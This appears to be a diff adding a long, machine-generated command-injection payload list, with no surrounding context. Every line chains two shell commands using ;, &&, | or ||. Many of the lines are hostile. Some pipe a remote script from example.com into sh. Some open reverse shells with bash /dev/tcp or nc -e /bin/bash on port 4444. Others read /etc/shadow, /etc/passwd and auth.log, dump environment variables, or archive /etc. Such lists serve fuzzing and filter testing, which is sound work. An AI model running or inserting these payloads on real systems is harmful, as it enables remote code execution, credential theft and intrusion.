+/usr/bin/printf 'pwned\n' ; php -r 'system("id");'
+/usr/bin/printf 'pwned\n' && php -r 'system("id");'
+/usr/bin/printf 'pwned\n' | php -r 'system("id");'
+/usr/bin/printf 'pwned\n' || php -r 'system("id");'
+/usr/bin/printf 'pwned\n' ; ruby -e 'puts `id`'
+/usr/bin/printf 'pwned\n' && ruby -e 'puts `id`'
+/usr/bin/printf 'pwned\n' | ruby -e 'puts `id`'
+/usr/bin/printf 'pwned\n' || ruby -e 'puts `id`'
+/usr/bin/printf 'pwned\n' ; /bin/bash -c 'id'
+/usr/bin/printf 'pwned\n' && /bin/bash -c 'id'
+/usr/bin/printf 'pwned\n' | /bin/bash -c 'id'
+/usr/bin/printf 'pwned\n' || /bin/bash -c 'id'
+/usr/bin/printf 'pwned\n' ; /usr/bin/id >/tmp/id.txt
+/usr/bin/printf 'pwned\n' && /usr/bin/id >/tmp/id.txt
+/usr/bin/printf 'pwned\n' | /usr/bin/id >/tmp/id.txt
+/usr/bin/printf 'pwned\n' || /usr/bin/id >/tmp/id.txt
+/usr/bin/printf 'pwned\n' ; /bin/echo pwned > /tmp/pwned.txt
+/usr/bin/printf 'pwned\n' && /bin/echo pwned > /tmp/pwned.txt
+/usr/bin/printf 'pwned\n' | /bin/echo pwned > /tmp/pwned.txt
+/usr/bin/printf 'pwned\n' || /bin/echo pwned > /tmp/pwned.txt
+/usr/bin/printf 'pwned\n' ; /usr/bin/printf 'pwned\n'
+/usr/bin/printf 'pwned\n' && /usr/bin/printf 'pwned\n'
+/usr/bin/printf 'pwned\n' | /usr/bin/printf 'pwned\n'
+/usr/bin/printf 'pwned\n' || /usr/bin/printf 'pwned\n'
+/usr/bin/printf 'pwned\n' ; chmod +x /tmp/pwned
+/usr/bin/printf 'pwned\n' && chmod +x /tmp/pwned
+/usr/bin/printf 'pwned\n' | chmod +x /tmp/pwned
+/usr/bin/printf 'pwned\n' || chmod +x /tmp/pwned
+/usr/bin/printf 'pwned\n' ; tar -cf /tmp/dump.tar /etc
+/usr/bin/printf 'pwned\n' && tar -cf /tmp/dump.tar /etc
+/usr/bin/printf 'pwned\n' | tar -cf /tmp/dump.tar /etc
+/usr/bin/printf 'pwned\n' || tar -cf /tmp/dump.tar /etc
+/usr/bin/printf 'pwned\n' ; openssl s_client -connect example.com:443
+/usr/bin/printf 'pwned\n' && openssl s_client -connect example.com:443
+/usr/bin/printf 'pwned\n' | openssl s_client -connect example.com:443
+/usr/bin/printf 'pwned\n' || openssl s_client -connect example.com:443
+/usr/bin/printf 'pwned\n' ; ssh localhost id
+/usr/bin/printf 'pwned\n' && ssh localhost id
+/usr/bin/printf 'pwned\n' | ssh localhost id
+/usr/bin/printf 'pwned\n' || ssh localhost id
+/usr/bin/printf 'pwned\n' ; ftp http://example.com/pwn.sh
+/usr/bin/printf 'pwned\n' && ftp http://example.com/pwn.sh
+/usr/bin/printf 'pwned\n' | ftp http://example.com/pwn.sh
+/usr/bin/printf 'pwned\n' || ftp http://example.com/pwn.sh
+chmod +x /tmp/pwned ; id
+chmod +x /tmp/pwned && id
+chmod +x /tmp/pwned | id
+chmod +x /tmp/pwned || id
+chmod +x /tmp/pwned ; uname -a
+chmod +x /tmp/pwned && uname -a
+chmod +x /tmp/pwned | uname -a
+chmod +x /tmp/pwned || uname -a
+chmod +x /tmp/pwned ; whoami
+chmod +x /tmp/pwned && whoami
+chmod +x /tmp/pwned | whoami
+chmod +x /tmp/pwned || whoami
+chmod +x /tmp/pwned ; ls -la /
+chmod +x /tmp/pwned && ls -la /
+chmod +x /tmp/pwned | ls -la /
+chmod +x /tmp/pwned || ls -la /
+chmod +x /tmp/pwned ; ls -la /etc
+chmod +x /tmp/pwned && ls -la /etc
+chmod +x /tmp/pwned | ls -la /etc
+chmod +x /tmp/pwned || ls -la /etc
+chmod +x /tmp/pwned ; ls -lha /root
+chmod +x /tmp/pwned && ls -lha /root
+chmod +x /tmp/pwned | ls -lha /root
+chmod +x /tmp/pwned || ls -lha /root
+chmod +x /tmp/pwned ; cat /etc/passwd
+chmod +x /tmp/pwned && cat /etc/passwd
+chmod +x /tmp/pwned | cat /etc/passwd
+chmod +x /tmp/pwned || cat /etc/passwd
+chmod +x /tmp/pwned ; cat /etc/shadow
+chmod +x /tmp/pwned && cat /etc/shadow
+chmod +x /tmp/pwned | cat /etc/shadow
+chmod +x /tmp/pwned || cat /etc/shadow
+chmod +x /tmp/pwned ; cat /etc/hosts
+chmod +x /tmp/pwned && cat /etc/hosts
+chmod +x /tmp/pwned | cat /etc/hosts
+chmod +x /tmp/pwned || cat /etc/hosts
+chmod +x /tmp/pwned ; cat /var/log/auth.log
+chmod +x /tmp/pwned && cat /var/log/auth.log
+chmod +x /tmp/pwned | cat /var/log/auth.log
+chmod +x /tmp/pwned || cat /var/log/auth.log
+chmod +x /tmp/pwned ; env
+chmod +x /tmp/pwned && env
+chmod +x /tmp/pwned | env
+chmod +x /tmp/pwned || env
+chmod +x /tmp/pwned ; ps aux
+chmod +x /tmp/pwned && ps aux
+chmod +x /tmp/pwned | ps aux
+chmod +x /tmp/pwned || ps aux
+chmod +x /tmp/pwned ; netstat -tulnp
+chmod +x /tmp/pwned && netstat -tulnp
+chmod +x /tmp/pwned | netstat -tulnp
+chmod +x /tmp/pwned || netstat -tulnp
+chmod +x /tmp/pwned ; mtr -r 127.0.0.1 -c 1
+chmod +x /tmp/pwned && mtr -r 127.0.0.1 -c 1
+chmod +x /tmp/pwned | mtr -r 127.0.0.1 -c 1
+chmod +x /tmp/pwned || mtr -r 127.0.0.1 -c 1
+chmod +x /tmp/pwned ; curl http://example.com/pwn.sh | sh
+chmod +x /tmp/pwned && curl http://example.com/pwn.sh | sh
+chmod +x /tmp/pwned | curl http://example.com/pwn.sh | sh
+chmod +x /tmp/pwned || curl http://example.com/pwn.sh | sh
+chmod +x /tmp/pwned ; wget http://example.com/pwn.sh -O- | sh
+chmod +x /tmp/pwned && wget http://example.com/pwn.sh -O- | sh
+chmod +x /tmp/pwned | wget http://example.com/pwn.sh -O- | sh
+chmod +x /tmp/pwned || wget http://example.com/pwn.sh -O- | sh
+chmod +x /tmp/pwned ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+chmod +x /tmp/pwned && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+chmod +x /tmp/pwned | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+chmod +x /tmp/pwned || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+chmod +x /tmp/pwned ; nc 127.0.0.1 4444 -e /bin/bash
+chmod +x /tmp/pwned && nc 127.0.0.1 4444 -e /bin/bash
+chmod +x /tmp/pwned | nc 127.0.0.1 4444 -e /bin/bash
+chmod +x /tmp/pwned || nc 127.0.0.1 4444 -e /bin/bash
+chmod +x /tmp/pwned ; python -c 'import os;print(os.listdir("/"))'
+chmod +x /tmp/pwned && python -c 'import os;print(os.listdir("/"))'
+chmod +x /tmp/pwned | python -c 'import os;print(os.listdir("/"))'
+chmod +x /tmp/pwned || python -c 'import os;print(os.listdir("/"))'
+chmod +x /tmp/pwned ; perl -e 'print "pwned"'
+chmod +x /tmp/pwned && perl -e 'print "pwned"'
+chmod +x /tmp/pwned | perl -e 'print "pwned"'
+chmod +x /tmp/pwned || perl -e 'print "pwned"'
+chmod +x /tmp/pwned ; php -r 'system("id");'
+chmod +x /tmp/pwned && php -r 'system("id");'
+chmod +x /tmp/pwned | php -r 'system("id");'
+chmod +x /tmp/pwned || php -r 'system("id");'
+chmod +x /tmp/pwned ; ruby -e 'puts `id`'
+chmod +x /tmp/pwned && ruby -e 'puts `id`'
+chmod +x /tmp/pwned | ruby -e 'puts `id`'
+chmod +x /tmp/pwned || ruby -e 'puts `id`'
+chmod +x /tmp/pwned ; /bin/bash -c 'id'
+chmod +x /tmp/pwned && /bin/bash -c 'id'
+chmod +x /tmp/pwned | /bin/bash -c 'id'
+chmod +x /tmp/pwned || /bin/bash -c 'id'
+chmod +x /tmp/pwned ; /usr/bin/id >/tmp/id.txt
+chmod +x /tmp/pwned && /usr/bin/id >/tmp/id.txt
+chmod +x /tmp/pwned | /usr/bin/id >/tmp/id.txt
+chmod +x /tmp/pwned || /usr/bin/id >/tmp/id.txt
+chmod +x /tmp/pwned ; /bin/echo pwned > /tmp/pwned.txt
+chmod +x /tmp/pwned && /bin/echo pwned > /tmp/pwned.txt
+chmod +x /tmp/pwned | /bin/echo pwned > /tmp/pwned.txt
+chmod +x /tmp/pwned || /bin/echo pwned > /tmp/pwned.txt
+chmod +x /tmp/pwned ; /usr/bin/printf 'pwned\n'
+chmod +x /tmp/pwned && /usr/bin/printf 'pwned\n'
+chmod +x /tmp/pwned | /usr/bin/printf 'pwned\n'
+chmod +x /tmp/pwned || /usr/bin/printf 'pwned\n'
+chmod +x /tmp/pwned ; chmod +x /tmp/pwned
+chmod +x /tmp/pwned && chmod +x /tmp/pwned
+chmod +x /tmp/pwned | chmod +x /tmp/pwned
+chmod +x /tmp/pwned || chmod +x /tmp/pwned
+chmod +x /tmp/pwned ; tar -cf /tmp/dump.tar /etc
+chmod +x /tmp/pwned && tar -cf /tmp/dump.tar /etc
+chmod +x /tmp/pwned | tar -cf /tmp/dump.tar /etc
+chmod +x /tmp/pwned || tar -cf /tmp/dump.tar /etc
+chmod +x /tmp/pwned ; openssl s_client -connect example.com:443
+chmod +x /tmp/pwned && openssl s_client -connect example.com:443
+chmod +x /tmp/pwned | openssl s_client -connect example.com:443
+chmod +x /tmp/pwned || openssl s_client -connect example.com:443
+chmod +x /tmp/pwned ; ssh localhost id
+chmod +x /tmp/pwned && ssh localhost id
+chmod +x /tmp/pwned | ssh localhost id
+chmod +x /tmp/pwned || ssh localhost id
+chmod +x /tmp/pwned ; ftp http://example.com/pwn.sh
+chmod +x /tmp/pwned && ftp http://example.com/pwn.sh
+chmod +x /tmp/pwned | ftp http://example.com/pwn.sh
+chmod +x /tmp/pwned || ftp http://example.com/pwn.sh
+tar -cf /tmp/dump.tar /etc ; id
+tar -cf /tmp/dump.tar /etc && id
+tar -cf /tmp/dump.tar /etc | id
+tar -cf /tmp/dump.tar /etc || id
+tar -cf /tmp/dump.tar /etc ; uname -a
+tar -cf /tmp/dump.tar /etc && uname -a
+tar -cf /tmp/dump.tar /etc | uname -a
+tar -cf /tmp/dump.tar /etc || uname -a
+tar -cf /tmp/dump.tar /etc ; whoami
+tar -cf /tmp/dump.tar /etc && whoami
+tar -cf /tmp/dump.tar /etc | whoami
+tar -cf /tmp/dump.tar /etc || whoami
+tar -cf /tmp/dump.tar /etc ; ls -la /
+tar -cf /tmp/dump.tar /etc && ls -la /
+tar -cf /tmp/dump.tar /etc | ls -la /
+tar -cf /tmp/dump.tar /etc || ls -la /
+tar -cf /tmp/dump.tar /etc ; ls -la /etc
+tar -cf /tmp/dump.tar /etc && ls -la /etc
+tar -cf /tmp/dump.tar /etc | ls -la /etc
+tar -cf /tmp/dump.tar /etc || ls -la /etc
+tar -cf /tmp/dump.tar /etc ; ls -lha /root
+tar -cf /tmp/dump.tar /etc && ls -lha /root
+tar -cf /tmp/dump.tar /etc | ls -lha /root
+tar -cf /tmp/dump.tar /etc || ls -lha /root
+tar -cf /tmp/dump.tar /etc ; cat /etc/passwd
+tar -cf /tmp/dump.tar /etc && cat /etc/passwd
+tar -cf /tmp/dump.tar /etc | cat /etc/passwd
+tar -cf /tmp/dump.tar /etc || cat /etc/passwd
+tar -cf /tmp/dump.tar /etc ; cat /etc/shadow
+tar -cf /tmp/dump.tar /etc && cat /etc/shadow
+tar -cf /tmp/dump.tar /etc | cat /etc/shadow
+tar -cf /tmp/dump.tar /etc || cat /etc/shadow
+tar -cf /tmp/dump.tar /etc ; cat /etc/hosts
+tar -cf /tmp/dump.tar /etc && cat /etc/hosts
+tar -cf /tmp/dump.tar /etc | cat /etc/hosts
+tar -cf /tmp/dump.tar /etc || cat /etc/hosts
+tar -cf /tmp/dump.tar /etc ; cat /var/log/auth.log
+tar -cf /tmp/dump.tar /etc && cat /var/log/auth.log
+tar -cf /tmp/dump.tar /etc | cat /var/log/auth.log
+tar -cf /tmp/dump.tar /etc || cat /var/log/auth.log
+tar -cf /tmp/dump.tar /etc ; env
+tar -cf /tmp/dump.tar /etc && env
+tar -cf /tmp/dump.tar /etc | env
+tar -cf /tmp/dump.tar /etc || env
+tar -cf /tmp/dump.tar /etc ; ps aux
+tar -cf /tmp/dump.tar /etc && ps aux
+tar -cf /tmp/dump.tar /etc | ps aux
+tar -cf /tmp/dump.tar /etc || ps aux
+tar -cf /tmp/dump.tar /etc ; netstat -tulnp
+tar -cf /tmp/dump.tar /etc && netstat -tulnp
+tar -cf /tmp/dump.tar /etc | netstat -tulnp
+tar -cf /tmp/dump.tar /etc || netstat -tulnp
+tar -cf /tmp/dump.tar /etc ; mtr -r 127.0.0.1 -c 1
+tar -cf /tmp/dump.tar /etc && mtr -r 127.0.0.1 -c 1
+tar -cf /tmp/dump.tar /etc | mtr -r 127.0.0.1 -c 1
+tar -cf /tmp/dump.tar /etc || mtr -r 127.0.0.1 -c 1
+tar -cf /tmp/dump.tar /etc ; curl http://example.com/pwn.sh | sh
+tar -cf /tmp/dump.tar /etc && curl http://example.com/pwn.sh | sh
+tar -cf /tmp/dump.tar /etc | curl http://example.com/pwn.sh | sh
+tar -cf /tmp/dump.tar /etc || curl http://example.com/pwn.sh | sh
+tar -cf /tmp/dump.tar /etc ; wget http://example.com/pwn.sh -O- | sh
+tar -cf /tmp/dump.tar /etc && wget http://example.com/pwn.sh -O- | sh
+tar -cf /tmp/dump.tar /etc | wget http://example.com/pwn.sh -O- | sh
+tar -cf /tmp/dump.tar /etc || wget http://example.com/pwn.sh -O- | sh
+tar -cf /tmp/dump.tar /etc ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+tar -cf /tmp/dump.tar /etc && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+tar -cf /tmp/dump.tar /etc | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+tar -cf /tmp/dump.tar /etc || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+tar -cf /tmp/dump.tar /etc ; nc 127.0.0.1 4444 -e /bin/bash
+tar -cf /tmp/dump.tar /etc && nc 127.0.0.1 4444 -e /bin/bash
+tar -cf /tmp/dump.tar /etc | nc 127.0.0.1 4444 -e /bin/bash
+tar -cf /tmp/dump.tar /etc || nc 127.0.0.1 4444 -e /bin/bash
+tar -cf /tmp/dump.tar /etc ; python -c 'import os;print(os.listdir("/"))'
+tar -cf /tmp/dump.tar /etc && python -c 'import os;print(os.listdir("/"))'
+tar -cf /tmp/dump.tar /etc | python -c 'import os;print(os.listdir("/"))'
+tar -cf /tmp/dump.tar /etc || python -c 'import os;print(os.listdir("/"))'
+tar -cf /tmp/dump.tar /etc ; perl -e 'print "pwned"'
+tar -cf /tmp/dump.tar /etc && perl -e 'print "pwned"'
+tar -cf /tmp/dump.tar /etc | perl -e 'print "pwned"'
+tar -cf /tmp/dump.tar /etc || perl -e 'print "pwned"'
+tar -cf /tmp/dump.tar /etc ; php -r 'system("id");'
+tar -cf /tmp/dump.tar /etc && php -r 'system("id");'
+tar -cf /tmp/dump.tar /etc | php -r 'system("id");'
+tar -cf /tmp/dump.tar /etc || php -r 'system("id");'
+tar -cf /tmp/dump.tar /etc ; ruby -e 'puts `id`'
+tar -cf /tmp/dump.tar /etc && ruby -e 'puts `id`'
+tar -cf /tmp/dump.tar /etc | ruby -e 'puts `id`'
+tar -cf /tmp/dump.tar /etc || ruby -e 'puts `id`'
+tar -cf /tmp/dump.tar /etc ; /bin/bash -c 'id'
+tar -cf /tmp/dump.tar /etc && /bin/bash -c 'id'
+tar -cf /tmp/dump.tar /etc | /bin/bash -c 'id'
+tar -cf /tmp/dump.tar /etc || /bin/bash -c 'id'
+tar -cf /tmp/dump.tar /etc ; /usr/bin/id >/tmp/id.txt
+tar -cf /tmp/dump.tar /etc && /usr/bin/id >/tmp/id.txt
+tar -cf /tmp/dump.tar /etc | /usr/bin/id >/tmp/id.txt
+tar -cf /tmp/dump.tar /etc || /usr/bin/id >/tmp/id.txt
+tar -cf /tmp/dump.tar /etc ; /bin/echo pwned > /tmp/pwned.txt
+tar -cf /tmp/dump.tar /etc && /bin/echo pwned > /tmp/pwned.txt
+tar -cf /tmp/dump.tar /etc | /bin/echo pwned > /tmp/pwned.txt
+tar -cf /tmp/dump.tar /etc || /bin/echo pwned > /tmp/pwned.txt
+tar -cf /tmp/dump.tar /etc ; /usr/bin/printf 'pwned\n'
+tar -cf /tmp/dump.tar /etc && /usr/bin/printf 'pwned\n'
+tar -cf /tmp/dump.tar /etc | /usr/bin/printf 'pwned\n'
+tar -cf /tmp/dump.tar /etc || /usr/bin/printf 'pwned\n'
+tar -cf /tmp/dump.tar /etc ; chmod +x /tmp/pwned
+tar -cf /tmp/dump.tar /etc && chmod +x /tmp/pwned
+tar -cf /tmp/dump.tar /etc | chmod +x /tmp/pwned
+tar -cf /tmp/dump.tar /etc || chmod +x /tmp/pwned
+tar -cf /tmp/dump.tar /etc ; tar -cf /tmp/dump.tar /etc
+tar -cf /tmp/dump.tar /etc && tar -cf /tmp/dump.tar /etc
+tar -cf /tmp/dump.tar /etc | tar -cf /tmp/dump.tar /etc
+tar -cf /tmp/dump.tar /etc || tar -cf /tmp/dump.tar /etc
+tar -cf /tmp/dump.tar /etc ; openssl s_client -connect example.com:443
+tar -cf /tmp/dump.tar /etc && openssl s_client -connect example.com:443
+tar -cf /tmp/dump.tar /etc | openssl s_client -connect example.com:443
+tar -cf /tmp/dump.tar /etc || openssl s_client -connect example.com:443
+tar -cf /tmp/dump.tar /etc ; ssh localhost id
+tar -cf /tmp/dump.tar /etc && ssh localhost id
+tar -cf /tmp/dump.tar /etc | ssh localhost id
+tar -cf /tmp/dump.tar /etc || ssh localhost id
+tar -cf /tmp/dump.tar /etc ; ftp http://example.com/pwn.sh
+tar -cf /tmp/dump.tar /etc && ftp http://example.com/pwn.sh
+tar -cf /tmp/dump.tar /etc | ftp http://example.com/pwn.sh
+tar -cf /tmp/dump.tar /etc || ftp http://example.com/pwn.sh
+openssl s_client -connect example.com:443 ; id
+openssl s_client -connect example.com:443 && id
+openssl s_client -connect example.com:443 | id
+openssl s_client -connect example.com:443 || id
+openssl s_client -connect example.com:443 ; uname -a
+openssl s_client -connect example.com:443 && uname -a
+openssl s_client -connect example.com:443 | uname -a
+openssl s_client -connect example.com:443 || uname -a
+openssl s_client -connect example.com:443 ; whoami
+openssl s_client -connect example.com:443 && whoami
+openssl s_client -connect example.com:443 | whoami
+openssl s_client -connect example.com:443 || whoami
+openssl s_client -connect example.com:443 ; ls -la /
+openssl s_client -connect example.com:443 && ls -la /
+openssl s_client -connect example.com:443 | ls -la /
+openssl s_client -connect example.com:443 || ls -la /
+openssl s_client -connect example.com:443 ; ls -la /etc
+openssl s_client -connect example.com:443 && ls -la /etc
+openssl s_client -connect example.com:443 | ls -la /etc
+openssl s_client -connect example.com:443 || ls -la /etc
+openssl s_client -connect example.com:443 ; ls -lha /root
+openssl s_client -connect example.com:443 && ls -lha /root
+openssl s_client -connect example.com:443 | ls -lha /root
+openssl s_client -connect example.com:443 || ls -lha /root
+openssl s_client -connect example.com:443 ; cat /etc/passwd
+openssl s_client -connect example.com:443 && cat /etc/passwd
+openssl s_client -connect example.com:443 | cat /etc/passwd
+openssl s_client -connect example.com:443 || cat /etc/passwd
+openssl s_client -connect example.com:443 ; cat /etc/shadow
+openssl s_client -connect example.com:443 && cat /etc/shadow
+openssl s_client -connect example.com:443 | cat /etc/shadow
+openssl s_client -connect example.com:443 || cat /etc/shadow
+openssl s_client -connect example.com:443 ; cat /etc/hosts
+openssl s_client -connect example.com:443 && cat /etc/hosts
+openssl s_client -connect example.com:443 | cat /etc/hosts
+openssl s_client -connect example.com:443 || cat /etc/hosts
+openssl s_client -connect example.com:443 ; cat /var/log/auth.log
+openssl s_client -connect example.com:443 && cat /var/log/auth.log
+openssl s_client -connect example.com:443 | cat /var/log/auth.log
+openssl s_client -connect example.com:443 || cat /var/log/auth.log
+openssl s_client -connect example.com:443 ; env
+openssl s_client -connect example.com:443 && env
+openssl s_client -connect example.com:443 | env
+openssl s_client -connect example.com:443 || env
+openssl s_client -connect example.com:443 ; ps aux
+openssl s_client -connect example.com:443 && ps aux
+openssl s_client -connect example.com:443 | ps aux
+openssl s_client -connect example.com:443 || ps aux
+openssl s_client -connect example.com:443 ; netstat -tulnp
+openssl s_client -connect example.com:443 && netstat -tulnp
+openssl s_client -connect example.com:443 | netstat -tulnp
+openssl s_client -connect example.com:443 || netstat -tulnp
+openssl s_client -connect example.com:443 ; mtr -r 127.0.0.1 -c 1
+openssl s_client -connect example.com:443 && mtr -r 127.0.0.1 -c 1
+openssl s_client -connect example.com:443 | mtr -r 127.0.0.1 -c 1
+openssl s_client -connect example.com:443 || mtr -r 127.0.0.1 -c 1
+openssl s_client -connect example.com:443 ; curl http://example.com/pwn.sh | sh
+openssl s_client -connect example.com:443 && curl http://example.com/pwn.sh | sh
+openssl s_client -connect example.com:443 | curl http://example.com/pwn.sh | sh
+openssl s_client -connect example.com:443 || curl http://example.com/pwn.sh | sh
+openssl s_client -connect example.com:443 ; wget http://example.com/pwn.sh -O- | sh
+openssl s_client -connect example.com:443 && wget http://example.com/pwn.sh -O- | sh
+openssl s_client -connect example.com:443 | wget http://example.com/pwn.sh -O- | sh
+openssl s_client -connect example.com:443 || wget http://example.com/pwn.sh -O- | sh
+openssl s_client -connect example.com:443 ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+openssl s_client -connect example.com:443 && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+openssl s_client -connect example.com:443 | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+openssl s_client -connect example.com:443 || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+openssl s_client -connect example.com:443 ; nc 127.0.0.1 4444 -e /bin/bash
+openssl s_client -connect example.com:443 && nc 127.0.0.1 4444 -e /bin/bash
+openssl s_client -connect example.com:443 | nc 127.0.0.1 4444 -e /bin/bash
+openssl s_client -connect example.com:443 || nc 127.0.0.1 4444 -e /bin/bash
+openssl s_client -connect example.com:443 ; python -c 'import os;print(os.listdir("/"))'
+openssl s_client -connect example.com:443 && python -c 'import os;print(os.listdir("/"))'
+openssl s_client -connect example.com:443 | python -c 'import os;print(os.listdir("/"))'
+openssl s_client -connect example.com:443 || python -c 'import os;print(os.listdir("/"))'
+openssl s_client -connect example.com:443 ; perl -e 'print "pwned"'
+openssl s_client -connect example.com:443 && perl -e 'print "pwned"'
+openssl s_client -connect example.com:443 | perl -e 'print "pwned"'
+openssl s_client -connect example.com:443 || perl -e 'print "pwned"'
+openssl s_client -connect example.com:443 ; php -r 'system("id");'
+openssl s_client -connect example.com:443 && php -r 'system("id");'
+openssl s_client -connect example.com:443 | php -r 'system("id");'
+openssl s_client -connect example.com:443 || php -r 'system("id");'
+openssl s_client -connect example.com:443 ; ruby -e 'puts `id`'
+openssl s_client -connect example.com:443 && ruby -e 'puts `id`'
+openssl s_client -connect example.com:443 | ruby -e 'puts `id`'
+openssl s_client -connect example.com:443 || ruby -e 'puts `id`'
+openssl s_client -connect example.com:443 ; /bin/bash -c 'id'
+openssl s_client -connect example.com:443 && /bin/bash -c 'id'
+openssl s_client -connect example.com:443 | /bin/bash -c 'id'
+openssl s_client -connect example.com:443 || /bin/bash -c 'id'
+openssl s_client -connect example.com:443 ; /usr/bin/id >/tmp/id.txt
+openssl s_client -connect example.com:443 && /usr/bin/id >/tmp/id.txt
+openssl s_client -connect example.com:443 | /usr/bin/id >/tmp/id.txt
+openssl s_client -connect example.com:443 || /usr/bin/id >/tmp/id.txt
+openssl s_client -connect example.com:443 ; /bin/echo pwned > /tmp/pwned.txt
+openssl s_client -connect example.com:443 && /bin/echo pwned > /tmp/pwned.txt
+openssl s_client -connect example.com:443 | /bin/echo pwned > /tmp/pwned.txt
+openssl s_client -connect example.com:443 || /bin/echo pwned > /tmp/pwned.txt
+openssl s_client -connect example.com:443 ; /usr/bin/printf 'pwned\n'
+openssl s_client -connect example.com:443 && /usr/bin/printf 'pwned\n'
+openssl s_client -connect example.com:443 | /usr/bin/printf 'pwned\n'
+openssl s_client -connect example.com:443 || /usr/bin/printf 'pwned\n'
+openssl s_client -connect example.com:443 ; chmod +x /tmp/pwned
+openssl s_client -connect example.com:443 && chmod +x /tmp/pwned
+openssl s_client -connect example.com:443 | chmod +x /tmp/pwned
+openssl s_client -connect example.com:443 || chmod +x /tmp/pwned
+openssl s_client -connect example.com:443 ; tar -cf /tmp/dump.tar /etc
+openssl s_client -connect example.com:443 && tar -cf /tmp/dump.tar /etc
+openssl s_client -connect example.com:443 | tar -cf /tmp/dump.tar /etc
+openssl s_client -connect example.com:443 || tar -cf /tmp/dump.tar /etc
+openssl s_client -connect example.com:443 ; openssl s_client -connect example.com:443
+openssl s_client -connect example.com:443 && openssl s_client -connect example.com:443
+openssl s_client -connect example.com:443 | openssl s_client -connect example.com:443
+openssl s_client -connect example.com:443 || openssl s_client -connect example.com:443
+openssl s_client -connect example.com:443 ; ssh localhost id
+openssl s_client -connect example.com:443 && ssh localhost id
+openssl s_client -connect example.com:443 | ssh localhost id
+openssl s_client -connect example.com:443 || ssh localhost id
+openssl s_client -connect example.com:443 ; ftp http://example.com/pwn.sh
+openssl s_client -connect example.com:443 && ftp http://example.com/pwn.sh
+openssl s_client -connect example.com:443 | ftp http://example.com/pwn.sh
+openssl s_client -connect example.com:443 || ftp http://example.com/pwn.sh
+ssh localhost id ; id
+ssh localhost id && id
+ssh localhost id | id
+ssh localhost id || id
+ssh localhost id ; uname -a
+ssh localhost id && uname -a
+ssh localhost id | uname -a
+ssh localhost id || uname -a
+ssh localhost id ; whoami
+ssh localhost id && whoami
+ssh localhost id | whoami
+ssh localhost id || whoami
+ssh localhost id ; ls -la /
+ssh localhost id && ls -la /
+ssh localhost id | ls -la /
+ssh localhost id || ls -la /
+ssh localhost id ; ls -la /etc
+ssh localhost id && ls -la /etc
+ssh localhost id | ls -la /etc
+ssh localhost id || ls -la /etc
+ssh localhost id ; ls -lha /root
+ssh localhost id && ls -lha /root
+ssh localhost id | ls -lha /root
+ssh localhost id || ls -lha /root
+ssh localhost id ; cat /etc/passwd
+ssh localhost id && cat /etc/passwd
+ssh localhost id | cat /etc/passwd
+ssh localhost id || cat /etc/passwd
+ssh localhost id ; cat /etc/shadow
+ssh localhost id && cat /etc/shadow
+ssh localhost id | cat /etc/shadow
+ssh localhost id || cat /etc/shadow
+ssh localhost id ; cat /etc/hosts
+ssh localhost id && cat /etc/hosts
+ssh localhost id | cat /etc/hosts
+ssh localhost id || cat /etc/hosts
+ssh localhost id ; cat /var/log/auth.log
+ssh localhost id && cat /var/log/auth.log
+ssh localhost id | cat /var/log/auth.log
+ssh localhost id || cat /var/log/auth.log
+ssh localhost id ; env
+ssh localhost id && env
+ssh localhost id | env
+ssh localhost id || env
+ssh localhost id ; ps aux
+ssh localhost id && ps aux
+ssh localhost id | ps aux
+ssh localhost id || ps aux
+ssh localhost id ; netstat -tulnp
+ssh localhost id && netstat -tulnp
+ssh localhost id | netstat -tulnp
+ssh localhost id || netstat -tulnp
+ssh localhost id ; mtr -r 127.0.0.1 -c 1
+ssh localhost id && mtr -r 127.0.0.1 -c 1
+ssh localhost id | mtr -r 127.0.0.1 -c 1
+ssh localhost id || mtr -r 127.0.0.1 -c 1
+ssh localhost id ; curl http://example.com/pwn.sh | sh
+ssh localhost id && curl http://example.com/pwn.sh | sh
+ssh localhost id | curl http://example.com/pwn.sh | sh
+ssh localhost id || curl http://example.com/pwn.sh | sh
+ssh localhost id ; wget http://example.com/pwn.sh -O- | sh
+ssh localhost id && wget http://example.com/pwn.sh -O- | sh
+ssh localhost id | wget http://example.com/pwn.sh -O- | sh
+ssh localhost id || wget http://example.com/pwn.sh -O- | sh
+ssh localhost id ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ssh localhost id && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ssh localhost id | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ssh localhost id || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ssh localhost id ; nc 127.0.0.1 4444 -e /bin/bash
+ssh localhost id && nc 127.0.0.1 4444 -e /bin/bash
+ssh localhost id | nc 127.0.0.1 4444 -e /bin/bash
+ssh localhost id || nc 127.0.0.1 4444 -e /bin/bash
+ssh localhost id ; python -c 'import os;print(os.listdir("/"))'
+ssh localhost id && python -c 'import os;print(os.listdir("/"))'
+ssh localhost id | python -c 'import os;print(os.listdir("/"))'
+ssh localhost id || python -c 'import os;print(os.listdir("/"))'
+ssh localhost id ; perl -e 'print "pwned"'
+ssh localhost id && perl -e 'print "pwned"'
+ssh localhost id | perl -e 'print "pwned"'
+ssh localhost id || perl -e 'print "pwned"'
+ssh localhost id ; php -r 'system("id");'
+ssh localhost id && php -r 'system("id");'
+ssh localhost id | php -r 'system("id");'
+ssh localhost id || php -r 'system("id");'
+ssh localhost id ; ruby -e 'puts `id`'
+ssh localhost id && ruby -e 'puts `id`'
+ssh localhost id | ruby -e 'puts `id`'
+ssh localhost id || ruby -e 'puts `id`'
+ssh localhost id ; /bin/bash -c 'id'
+ssh localhost id && /bin/bash -c 'id'
+ssh localhost id | /bin/bash -c 'id'
+ssh localhost id || /bin/bash -c 'id'
+ssh localhost id ; /usr/bin/id >/tmp/id.txt
+ssh localhost id && /usr/bin/id >/tmp/id.txt
+ssh localhost id | /usr/bin/id >/tmp/id.txt
+ssh localhost id || /usr/bin/id >/tmp/id.txt
